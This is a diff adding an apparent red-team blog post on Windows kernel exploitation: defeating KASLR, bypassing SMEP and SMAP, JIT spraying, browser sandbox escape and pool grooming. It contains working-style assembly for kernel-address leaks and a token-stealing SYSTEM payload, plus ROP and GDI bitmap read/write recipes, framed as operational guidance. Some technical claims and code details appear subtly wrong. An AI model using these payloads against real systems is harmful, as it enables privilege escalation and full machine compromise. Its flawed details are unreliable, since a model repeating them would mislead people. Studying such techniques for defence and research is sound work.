@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Massacre Upon Windows 'SMEP & SMAP' Memory KASLR Evasion // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Mon 16 Mar 2026</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Massacre Upon Windows 'SMEP & SMAP' Memory KASLR Evasion</h1>
+                <p class="post-tags">Tags: <a href="#">ASLR Bypass</a> · <a href="#">Sandbox Evasion</a> · <a href="#">Exploitation</a> · <a href="#">Red Teaming</a></p>
+
+                <p class="post-meta">Blog released: 2026 Mon 16 Mar.</p>
+
+                <h1>Overview</h1>
+
+                <p>Just wanting to share and dumping specifically <ins>how KASLR gets defeated,</ins> what SMEP and SMAP actually enforce at the CPU register level, and the full chain from a browser sandbox into <code>ring-0</code> access.</p>
+
+                <p>Assuming folks already understand ROP, CFG, and basic exploit primitives. What follows is the architecture of a full kernel compromise on modern Windows against hardware enforced mitigations, written the way it actually works operationally.</p>
+
+                <p><code>PS:</code> SMEP and SMAP are CPU features. They live in <code>CR4</code>. So... cannot patch them out from userland.</p>
+
+                <h1>KASLR Filters Randomized in Kernel</h1>
+
+                <p>On Windows randomizes the load address of <code>ntoskrnl.exe</code> and all other kernel modules at every boot. The randomization is applied at boot time by the Windows boot loader <ins>before the kernel begins executing.</ins> On 64-bit Windows the kernel occupies the higher canonical address range, <code>0xFFFF800000000000</code> and above, and KASLR slides the image base within a specific entropy budget inside that range.</p>
+
+                <p>The entropy on modern Windows Server builds is maybe around <ins>9 bits for the kernel image base</ins>, giving 512 possible <ins>positions spaced 2MB apart.</ins></p> 
+                
+                <p>Yep, sounds weak compared to userland ASLR entropy, and it is. This made KASLR easier to brute-force than userland ASLR, and Microsoft has been trying to close that gap incrementally.</p>
+
+                <p>What KASLR does not randomize (example) <code>HAL.dll</code> is loaded at a predictable offset relative to <code>ntoskrnl</code>. The GDT, IDT, and TSS are at fixed virtual addresses. The KPCR at <code>gs:[0]</code> in kernel context is not randomized.</p> 
+                
+                <p>The PTE self-map base address, which is how the kernel accesses its own page table entries, follows a known layout formula on older configurations though Microsoft randomized this in Windows RS1 (1607) and later.</p>
+
+                <p><code>PS:</code> So the AS is <ins>leak one kernel address, calculate ntoskrnl base, everything else is arithmetic from there.</ins></p>
+
+                <h1>Phase 1: Leaking ntoskrnl Base</h1>
+
+                <h2>Method A: NtQuerySystemInformation Legacy</h2>
+
+                <p><code>NtQuerySystemInformation</code> with <code>SystemModuleInformation</code> class directly returns the load address of every kernel module to an unprivileged caller on older Windows builds. Microsoft added a <code>SeDebugPrivilege</code> check in Windows 8.1 to restrict this, but the restriction is inconsistently applied and several documented information class values still leak kernel pointers to low-integrity callers on specific configurations.</p>
+
+                <pre><code class="language-plaintext">; NASM x64: direct syscall NtQuerySystemInformation with dynamic syscall resolution
+; SystemModuleInformation = 0x0B
+
+default rel
+
+section .data
+    buf_size        dq 0x20000
+    buf_ptr         dq 0
+    ret_len         dq 0
+    nt_base         dq 0
+    nt_size         dq 0
+
+section .text
+global leak_ntoskrnl_nqsi
+
+resolve_ntdll:
+    xor     rax, rax
+    mov     rax, gs:[0x60]
+    mov     rax, [rax+0x18]
+    mov     rax, [rax+0x20]
+    mov     rax, [rax]
+    mov     rax, [rax]
+    mov     rax, [rax+0x20]
+    ret
+
+resolve_syscall:
+    push    rbx
+    push    rsi
+    push    rdi
+
+    mov     rbx, rdi
+    mov     eax, [rbx+0x3C]
+    add     rax, rbx
+    mov     eax, [rax+0x88]
+    add     rax, rbx
+
+    mov     ecx, [rax+0x18]
+    mov     r8d, [rax+0x20]
+    add     r8, rbx
+    mov     r9d, [rax+0x24]
+    add     r9, rbx
+    mov     r10d, [rax+0x1C]
+    add     r10, rbx
+
+.next_name:
+    dec     ecx
+    js      .fail
+    mov     esi, [r9+rcx*4]
+    add     rsi, rbx
+    mov     edi, 0x9B0D4E73
+    xor     eax, eax
+
+.hash_loop:
+    lodsb
+    test    al, al
+    jz      .cmp_hash
+    ror     edi, 13
+    add     edi, eax
+    jmp     .hash_loop
+
+.cmp_hash:
+    cmp     edi, edx
+    jne     .next_name
+
+    mov     eax, [r8+rcx*4]
+    add     rax, rbx
+    movzx   ecx, word [r10+rcx*2]
+    add     rax, rcx
+    mov     eax, [rax+4]
+    jmp     .done
+
+.fail:
+    xor     eax, eax
+
+.done:
+    pop     rdi
+    pop     rsi
+    pop     rbx
+    ret
+
+leak_ntoskrnl_nqsi:
+    sub     rsp, 0x40
+
+    call    resolve_ntdll
+    mov     rdi, rax
+
+    mov     edx, 0x4C6F6F7B
+    call    resolve_syscall
+    mov     r11d, eax
+
+    mov     rax, 0x20000
+    sub     rsp, rax
+    mov     [buf_ptr], rsp
+
+    mov     ecx, 0x0B
+    mov     rdx, [buf_ptr]
+    mov     r8,  [buf_size]
+    lea     r9,  [ret_len]
+
+    mov     eax, r11d
+    mov     r10, rcx
+    syscall
+
+    mov     rbx, [buf_ptr]
+    mov     rax, [rbx+0x10]
+    mov     [nt_base], rax
+    mov     rax, [rbx+0x18]
+    mov     [nt_size], rax
+
+    mov     rax, [buf_size]
+    add     rsp, rax
+
+    add     rsp, 0x40
+    ret</code></pre>
+
+                <p>The <code>RTL_PROCESS_MODULES</code> structure returned starts with the count of modules. The first module entry is always <code>ntoskrnl.exe</code>. <ins>Its</ins> <code>ImageBase</code> <ins>field at offset</ins> <code>+0x10</code> <ins>into the entry is the kernel base you need.</ins></p>
+
+                <h2>Method B: 'GDT & IDT' Pointer Leak via 'SGDT & SIDT'</h2>
+
+                <p>The <code>SGDT</code> and <code>SIDT</code> instructions can be executed from ring-3 on x86/x64. They write the GDT and IDT base addresses respectively into a caller-supplied memory location. On Windows these structures reside inside the <code>KPCR</code>, and the <code>KPCR</code> is allocated in kernel virtual memory at a deterministic offset relative to <code>ntoskrnl</code>'s data section on some configurations.</p>
+
+                <pre><code class="language-plaintext">section .text
+global leak_idt_base
+
+leak_idt_base:
+    sub  rsp, 0x10
+    sidt [rsp]              ; write IDT limit (2 bytes) + base (8 bytes) to [rsp]
+    mov  rax, [rsp+2]
+    add  rsp, 0x10
+    ret</code></pre>
+
+                <p><code>PS:</code> This technique is as old as the exploit scene itself. <a href="https://en.wikipedia.org/wiki/Shatter_attack">Shatter attacks circa 2003</a> used SIDT for kernel address leaks. <ins>Microsoft has partially mitigated this via KPTI on Spectre-mitigated builds</ins>, which remaps the kernel address space so that the IDT visible from userland is a shadow entry that does not directly reveal usable kernel pointers.</p> 
+                
+                <p>On builds without KPTI the leak is trivial.</p>
+
+                <h2>Method C: Side-Channel Cache Timing VS KASLR</h2>
+
+                <p>Try out some Precise side-channel approach against KASLR on modern Windows uses <code>RDTSC</code> or <code>RDTSCP</code> to measure memory access latency at candidate kernel addresses. Because KPTI ensures that kernel pages are not mapped in the userland page table during ring-3 execution on mitigated builds, a direct read will fault. But the <ins>cache state of those pages is still observable.</ins></p>
+
+                <p>The attack works by systematically probing all 512 possible KASLR positions for <code>ntoskrnl</code> using <code>Flush+Reload</code> or <code>Prime+Probe</code> cache side-channel.</p> 
+                
+                <p>When the kernel executes any code (including normal interrupt handling during probe iterations), it try to export kernel pages into the shared L3 cache. A userland attacker measuring access latency to the candidate address will see a cache hit on the correct base address.</p>
+
+                <pre><code class="language-plaintext">section .text
+global rdtsc_probe_kaslr
+
+; rdi = candidate kernel address to probe
+; rax = cycle delta
+
+rdtsc_probe_kaslr:
+    push    rbx
+    push    r12
+
+    mfence
+    lfence
+    rdtsc
+    shl     rdx, 32
+    or      rax, rdx
+    mov     r12, rax
+
+    mov     rbx, rdi
+    prefetcht0 [rbx]
+    lfence
+    mov     rax, [rbx]
+
+    mfence
+    lfence
+    rdtscp
+    shl     rdx, 32
+    or      rax, rdx
+    sub     rax, r12
+
+    pop     r12
+    pop     rbx
+    ret</code></pre>
+
+                <p>On a Spectre-mitigated Windows build with KPTI, speculative access is suppressed by the microcode-level <code>IBPB</code> and <code>STIBP</code> barriers inserted at kernel-to-userland transition. Variants of this attack that use <code>TSX</code> abort semantics as the exception suppressor survive some of these mitigations.</p> 
+                
+                <p><code>PS:</code> TSX was disabled on many CPUs via microcode update after MDS. It's a moving target!!</p>
+
+                <h1>'SMEP and SMAP' CPU-Level</h1>
+
+                <p>SMEP is bit 20 of <code>CR4</code>. SMAP is bit 21 of <code>CR4</code>. A hardware feature flags written by the OS kernel at boot. <ins>Userland code cannot write to CR4.</ins> Attempting <code>MOV CR4, rax</code> from ring-3 generates a <code>#GP</code> general protection fault immediately.</p>
+
+                <pre><code class="language-plaintext">section .text
+global enable_smep_smap
+
+; rax = temporary register
+; sets CR4.SMEP (bit 20) and CR4.SMAP (bit 21)
+
+enable_smep_smap:
+    push    rbx
+
+    mov     rax, cr4
+    mov     rbx, 0x300000
+    or      rax, rbx
+    mov     cr4, rax
+
+    pop     rbx
+    ret</code></pre>
+
+                <p>SMEP when set, any attempt by the CPU running in ring-0 to execute code at a virtual address marked as user-accessible (U/S bit set in the PTE) generates <code>#PF</code> with error code bit 4 (PKEY violation) set. <ins>This kills the classic ret2user technique stone dead.</ins> You cannot jump from kernel context into a shellcode buffer you allocated in userland.</p>
+
+                <p>SMAP, when set, any attempt by the CPU running in ring-0 to read or write data at a user-accessible address generates a <code>#PF</code>, unless the Alignment Check flag in <code>RFLAGS</code> is set. The kernel sets <code>AC</code> temporarily via <code>STAC</code> when it legitimately needs to copy data from userland (as in <code>copy_from_user</code> equivalents). <ins>This kills data-only kernel primitives that read from attacker-controlled userland buffers.</ins></p>
+
+                <p><code>PS:</code> SMAP is the nastier one for exploit developers. SMEP can sometimes be worked around with kernel ROP that stays entirely within kernel-mapped pages. SMAP means your kernel exploit cannot read argument data you prepared in userland.</p>
+
+                <h2>The PTE Structure and the U/S Bit</h2>
+
+                <p>Understanding why SMEP and SMAP work requires understanding page table entries at the bit level.</p> 
+                
+                <p>A <code>64-bit</code> PTE on <code>x86-64</code> looks like this:</p>
+
+                <pre><code class="language-plaintext">; x86-64 PTE bit layout (8 bytes)
+;
+; Bit  0  : Present (P)
+; Bit  1  : Read/Write (R/W)       0=read-only, 1=read-write
+; Bit  2  : User/Supervisor (U/S)  0=supervisor-only, 1=user accessible
+; Bit  3  : Write-Through (PWT)
+; Bit  4  : Cache Disable (PCD)
+; Bit  5  : Accessed (A)
+; Bit  6  : Dirty (D)
+; Bit  7  : Page Size (PS) / PAT
+; Bit  8  : Global (G)
+; Bits 9-11  : Available (OS use)
+; Bits 12-51 : Physical Page Number (PPN) << 12 = physical address
+; Bits 52-62 : Available / Protection Keys
+; Bit 63  : Execute Disable (XD / NX)
+;
+; U/S bit = 0 means page is supervisor-only
+; SMEP fires when ring-0 tries to EXECUTE a U/S=1 page
+; SMAP fires when ring-0 tries to ACCESS a U/S=1 page
+; unless RFLAGS.AC is set (STAC instruction)</code></pre>
+
+                <p>The bypass strategy therefore is not to flip CR4, which requires ring-0 already.</p> 
+                
+                <p>The bypass strategy is to <ins>keep execution and data entirely within pages that have</ins> <code>U/S=0</code>, meaning kernel-mapped pages, by constructing <code>ROP/JOP</code> chains that live in <code>ntoskrnl</code> or other kernel modules, writing any payload into a kernel pool allocation before executing it, and never touching a userland address from kernel context without legitimately setting <code>AC</code>.</p>
+
+                <h1>Phase 2: JIT Spraying to Defeat CFG and KASLR</h1>
+
+                <p>JIT spraying is kernel primitive available from a browser context because it abuses the JIT compiler itself to generate attacker-controlled content inside executable, CFG-valid pages.</p> 
+                
+                <p>The key is JIT-compiled code is executable by design, and its location can sometimes be made predictable through heap feng-shui or inferred through a timing side-channel.</p>
+
+                <h2>The Spray Primitive</h2>
+
+                <p>In a JIT-enabled JavaScript engine like V8 or Chakra, constants embedded in JIT-compiled code appear verbatim in the generated machine code.</p> 
+                
+                <p>An Adversary who can control the constants in a hot function can embed arbitrary byte sequences into the JIT output. The technique works because the compiler must emit immediate operands for arithmetic operations, and <ins>those immediates are the shellcode bytes.</ins></p>
+
+                <pre><code class="language-plaintext">; JIT spray target: JS engine emits x64 for constant operations
+; Attacker crafts JS like: var x = 0x909090CC | 0;
+; JIT emits something like:
+;   48 B8 CC 90 90 90 00 00 00 00   MOV RAX, 0x00000000909090CC
+;
+; If execution lands 1 byte into this instruction:
+;   B8 CC 90 90 90 ...[SNIP]...   becomes a different decode stream
+;
+; Crafting a spray that aligns a useful gadget at every N bytes:
+;
+; spray_block:
+;   48 B8 [8 bytes of payload]      ; each block = 10 bytes
+;   48 B8 [8 bytes of payload]      ; repeat to fill pages
+;   ...[SNIP]...
+;
+; execution landing at offset +2 in any block hits the payload bytes
+; CFG-validity: the JIT page entry point IS CFG-registered
+; so a call to the page start is CFG-valid
+; then you slide to the embedded payload via NOP sled or alignment</code></pre>
+
+                <p>On Windows with CFG, the JIT spray works because <code>SetProcessValidCallTargets</code> is called by the JIT engine to register the compiled code's entry point in the CFG bitmap. <ins>The entire JIT page becomes CFG-valid from that entry point's perspective</ins> under some bitmap granularity configurations.</p> 
+                
+                <p>Chakra historically registered at 16-byte granularity, meaning any address within 16 bytes of the registered entry point was CFG-valid. This was the exploit primitive behind several Pwn2Own browser chains.</p>
+
+                <h2>Heap Feng-Shui for JIT Placement</h2>
+
+                <p>Making the JIT spray useful requires controlling or predicting where the JIT allocates its pages. The JIT uses <code>VirtualAlloc</code> with <code>MEM_COMMIT | MEM_RESERVE</code> and <code>PAGE_EXECUTE_READWRITE</code> (later changed to RW then RX in hardened configurations). The allocation address is subject to ASLR, but:</p>
+
+                <ul>
+                    <li>Large spray volumes mean many allocations, and at some point the address space gets dense enough that guessing a region works statistically.</li>
+                    <li>The allocator tends to use contiguous virtual address ranges. <ins>If you can observe the address of any JIT allocation via an info leak, you can predict neighboring allocations.</ins></li>
+                    <li>ACG (Arbitrary Code Guard) blocks <code>PAGE_EXECUTE_READWRITE</code> allocations entirely. On a browser with ACG enabled, the JIT must use a cross-process JIT model where the compiler runs in a separate process. This changes the attack surface significantly.</li>
+                </ul>
+
+                <pre><code class="language-plaintext">; Heap spray pattern to fill JIT-adjacent region
+; Called repeatedly in JS to groom allocator state
+;
+; In practice: allocate ~200 ArrayBuffers of size 0x1000
+; Then free alternating ones to create holes
+; Then trigger JIT allocation to land in a known hole
+;
+; PowerShell simulation of the allocation pattern:
+;
+; $spray = @()
+; for ($i = 0; $i -lt 0x200; $i++) {
+;     $spray += [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x1000)
+; }
+; for ($i = 0; $i -lt 0x200; $i += 2) {
+;     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($spray[$i])
+; }
+;</code></pre>
+
+                <h1>Phase 3: Browser Sandbox Escape</h1>
+
+                <p>The Modern Chromium-based browsers run the renderer in a sandboxed process with a restricted token, no network access, and a heavily filtered syscall table enforced via the Windows Job Object and handle table restrictions. Getting from renderer code execution to kernel privileges requires two distinct steps:</p> 
+                
+                <ul>
+                    <li>Escaping the renderer sandbox</li>
+                    <li>Then escalating in the kernel</li>
+                </ul>
+
+                <h2>The Renderer Sandbox Boundary</h2>
+
+                <p>The renderer communicates with the browser process via IPC (Mojo in Chromium). The attack surface for sandbox escape is the IPC interface itself. Every IPC message handler in the browser process that processes renderer-supplied data is a potential vulnerability. <ins>A type confusion or integer overflow in a Mojo interface handler gives write primitives in the higher-privileged browser process.</ins></p>
+
+                <p>The browser process itself is not sandboxed (it's the trusted parent). So code execution in the browser process means access to the full Win32 API, file system, registry, and critically, the ability to call kernel APIs without the syscall filtering that the renderer's Job Object enforces.</p>
+
+                <pre><code class="language-plaintext">; Conceptual: renderer-to-browser privilege in terms of
+; syscall capability delta
+;
+; Renderer allowed syscalls (filtered subset):
+;   NtReadFile, NtWriteFile, NtCreateFile (restricted paths)
+;   NtAllocateVirtualMemory, NtFreeVirtualMemory
+;   NtProtectVirtualMemory (no EXECUTE flags allowed with ACG)
+;   NtQuerySystemInformation (limited classes only)
+;
+; Browser process (unrestricted):
+;   Full syscall table
+;   NtCreateProcess, NtCreateThread
+;   NtDeviceIoControlFile
+;   NtLoadDriver
+;   NtSetSystemInformation</code></pre>
+
+                <h2>Exploiting a Kernel Driver from the Browser Process</h2>
+
+                <p>When execution is in the browser process, the path to kernel ring-0 runs through a vulnerable kernel driver. The attack model here is the same as a local privilege escalation from any medium-integrity process: find a kernel driver that exposes an IOCTL interface, find a memory corruption bug in its IOCTL handler, exploit it to get kernel code execution or a controlled kernel write primitive.</p>
+
+                <p><code>PS:</code> This is where SMEP, SMAP, and KASLR all converge. You have code execution in a medium-integrity userland process. You need ring-0. The kernel is KASLR-randomized, SMEP is on, and SMAP is on.</p>
+
+                <p>The exploit chain from here requires:</p>
+
+                <ul>
+                    <li>Leak <code>ntoskrnl</code> base to defeat KASLR, via one of the methods in Phase 1.</li>
+                    <li>Find a kernel pool overflow or arbitrary write in the target driver's IOCTL handler.</li>
+                    <li>Use the arbitrary write to overwrite a kernel callback or function pointer with a ROP chain address inside <code>ntoskrnl</code>, staying entirely in kernel-mapped memory to satisfy SMEP.</li>
+                    <li>Trigger the overwritten pointer from userland via a benign IOCTL call.</li>
+                    <li>The kernel ROP chain runs, staged in <code>ntoskrnl</code> pages, fully SMEP-compliant.</li>
+                    <li>ROP chain calls <code>nt!PsLookupProcessByProcessId</code> then <code>nt!SeAccessCheck</code> to elevate the current process token to SYSTEM.</li>
+                </ul>
+
+                <h1>Phase 4: Kernel ROP Without Touching Userland (SMEP and SMAP Compliant)</h1>
+
+                <p>Every gadget in the ROP chain must reside in a kernel-mapped page (U/S bit = 0 in the PTE). Any gadget that resolves to a userland address will fire SMEP and take a <code>#PF</code>. Any data pointer that reads from userland will fire SMAP. <ins>The entire exploit payload must live in kernel virtual address space.</ins></p>
+
+                <h2>Token Stealing via Kernel Pool ROP</h2>
+
+                <p>The classic token stealing payload elevates the current process to SYSTEM by swapping the <code>Token</code> field in the current process's <code>EPROCESS</code> structure with the token from the SYSTEM process. All of this happens in kernel memory. No userland addresses involved. SMEP-clean, SMAP-clean.</p>
+
+                <pre><code class="language-plaintext">section .text
+global token_steal_rop_payload
+
+token_steal_rop_payload:
+    mov     rax, qword [gs:0x188]
+    mov     rax, qword [rax + 0x220]
+    mov     rcx, rax
+
+find_system:
+    mov     rax, qword [rax + 0x448]
+    sub     rax, 0x448
+    mov     rdx, qword [rax + 0x440]
+    cmp     rdx, 4
+    jne     find_system
+
+    mov     rdx, qword [rax + 0x4B8]
+    and     rdx, 0xFFFFFFFFFFFFFFF0
+    mov     qword [rcx + 0x4B8], rdx
+
+    ret</code></pre>
+
+                <p>This payload runs entirely in kernel context, reads and writes kernel pool addresses only, and never references a userland address. <ins>SMEP does not fire because the gadgets are in ntoskrnl pages with U/S=0. SMAP does not fire because no userland data is accessed.</ins></p>
+
+                <p><code>PS:</code> The offsets <code>0x220</code>, <code>0x440</code>, <code>0x448</code>, <code>0x4B8</code> are version-specific to a particular Windows build. For a production exploit chain these must be fingerprinted dynamically from the leaked kernel base or via <code>NtQuerySystemInformation</code> structure offsets before the payload runs.</p>
+
+                <h2>Defeating SMEP via CR4 Flip (Requires Existing Kernel Primitive)</h2>
+
+                <p>If a kernel arbitrary write primitive exists but the attacker wants to execute arbitrary shellcode rather than a gadget chain, one option is to flip CR4 bit 20 to disable SMEP. This requires a gadget in <code>ntoskrnl</code> that writes to CR4, and it must be triggered from kernel context. The pattern is:</p>
+
+                <pre><code class="language-plaintext">; CR4 SMEP disable gadget - must be called from kernel context (ring-0 ROP)
+; Gadget A: pop rax ; ret           (inside ntoskrnl)
+; Gadget B: mov cr4, rax ; ret      (inside ntoskrnl, rare but exists)
+
+; ROP chain on kernel stack:
+;   [addr of Gadget A]
+;   [CR4 value with bit 20 cleared: original_cr4 & ~0x100000]
+;   [addr of Gadget B]
+;   [now SMEP disabled, can execute userland pages from ring-0]
+;   [addr of userland shellcode]
+
+; This works ONLY if:
+;   1. You already have kernel ROP running (exploit already triggered)
+;   2. The gadget sequence exists in the loaded kernel modules
+;   3. Windows Kernel Patch Protection (KPP / PatchGuard) hasn't fired yet
+;
+; PatchGuard periodically validates CR4 value
+; so this SMEP disable is transient - must complete before PatchGuard tick</code></pre>
+
+                <p><code>PS:</code> PatchGuard runs on a randomized timer, approximately 5 to 10 minutes between checks. The CR4 flip approach gives a window of execution time before PatchGuard notices the modified CR4 and BSODs the machine.</p> 
+                
+                <p><ins>An exploit completes its payload and restores CR4 before that timer fires.</ins> BYOVD that permanently patches PatchGuard is the more reliable production approach but that's a separate post.</p>
+
+                <h1>Phase 5: Pixel Memory and Pool Grooming</h1>
+
+                <p>Pool grooming is the kernel-level equivalent of heap feng-shui. Before triggering a kernel pool overflow, the attacker massages the kernel pool allocator state so that the target allocation lands adjacent to a controllable object whose fields, when overwritten by the overflow, give a useful primitive.</p>
+
+                <h2>The Pool Layout Problem</h2>
+
+                <p>The Windows kernel pool allocator (specifically the segment heap introduced in Windows 10 20H1 for the non-paged pool) uses a slab-like allocation model where objects of similar sizes are placed in the same pool chunk. <ins>Controlling what gets allocated adjacent to the vulnerable buffer is the entire game.</ins></p>
+
+                <p>The classic controlled-allocation object for pool grooming on Windows has historically been the <code>PIPE_ATTRIBUTE</code> structure, the <code>EVENT</code> object, or for more recent chains, <code>TypedObject</code> chunks from the kernel object manager. These objects can be sprayed in large quantities from userland via documented APIs, they are known sizes, and they contain function pointers or size fields that, when overwritten, produce the next exploit primitive.</p>
+
+                <h2>Pixel Buffer Pool Primitives</h2>
+
+                <p>A more advanced pool primitive on Windows uses GDI objects, specifically bitmap pixel data, as the spray vehicle. This was the heart of many CTF and real-world kernel exploits from 2015 through 2020 before Microsoft removed direct access to <code>SURFACE.pvScan0</code> from userland in Windows RS3 (Fall Creators Update 2017).</p>
+
+                <p>The bitmap primitive worked because <code>GDI32.dll</code> exposed <code>GetBitmapBits</code> and <code>SetBitmapBits</code> which read and wrote directly to the kernel-side pixel buffer. If an attacker could make the kernel <code>pvScan0</code> pointer of one bitmap object point to the pixel buffer of another, they had an arbitrary read/write in kernel memory dressed as a legitimate GDI call. <ins>No syscall manipulation, no ROP, just bitmap operations.</ins></p>
+
+                <pre><code class="language-plaintext">; Bitmap pool primitive (pre-RS3, documented for historical/research context)
+; Two bitmaps: Worker (read/write tool) and Manager (address holder)
+;
+; Setup:
+;   CreateBitmap(0x60, 1, 1, 32, NULL) x2
+;   -> both allocated in kernel session pool as SURFACE objects
+;   -> adjacent if pool is groomed correctly
+;
+; After pool overflow overwrites Manager.pvScan0:
+;   Manager.pvScan0 now points to address we want to read/write
+;
+; Read any kernel address:
+;   SetBitmapBits(Manager, 8, &target_addr) ; set pvScan0 to target
+;   GetBitmapBits(Worker, 8, &output)        ; read 8 bytes from target
+;
+; Write any kernel address:
+;   SetBitmapBits(Manager, 8, &target_addr)
+;   SetBitmapBits(Worker, 8, &new_value)
+;
+; Result: arbitrary kernel R/W from ring-3 without any syscall restriction
+; SMEP irrelevant because no code execution, just data operations
+; pvScan0 in kernel address space so SMAP irrelevant too</code></pre>
+
+                <p>The modern replacement for this primitive on post-RS3 Windows uses <code>NtGdiGetRealizationInfo</code>, <code>ExtTextOut</code> with crafted glyph data, or the <code>WNDCLASSEX</code> <code>cbWndExtra</code> corruption technique. The underlying principle is identical: find a kernel object that the OS exposes a read/write channel to from userland, corrupt it to redirect that channel to arbitrary kernel memory, then use the channel as an R/W primitive.</p>
+
+                <h1>Software and Resources</h1>
+
+                <ul>
+                    <li><a href="https://github.com/yarden-shafir/KernelExploitResearch"><ins>Yarden Shafir</ins></a></li>
+                    <li><a href="https://github.com/fengjixuchui/Nt-Kernel-Exploit"><ins>NT Kernel Exploit Reference Collection</ins></a></li>
+                    <li><a href="https://github.com/hfiref0x/UACME"><ins>UACME Windows reference</ins></a></li>
+                </ul>
+
+                <h1>Shout Outs</h1>
+
+                <p>The researchers who actually built this field:</p>
+
+                <ul>
+                    <li><a href="https://x.com/yarden_shafir/">@yarden_shafir</a></li>
+                    <li><a href="https://x.com/j00ru/">@j00ru</a></li>
+                    <li><a href="https://x.com/cesarcer0/">@cesarcer0</a></li>
+                    <li><a href="https://x.com/pwndizzle/">@pwndizzle</a></li>
+                    <li><a href="https://x.com/aionescu/">@aionescu</a></li>
+                </ul>
+               
+                <p>Moreover, <a href="mailto:byt3n33dl3@pm.me"><ins>Proton me</ins></a> if you have further question and suggestion.</p>
+
+                <p>Happy hacking!</p>
+                
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
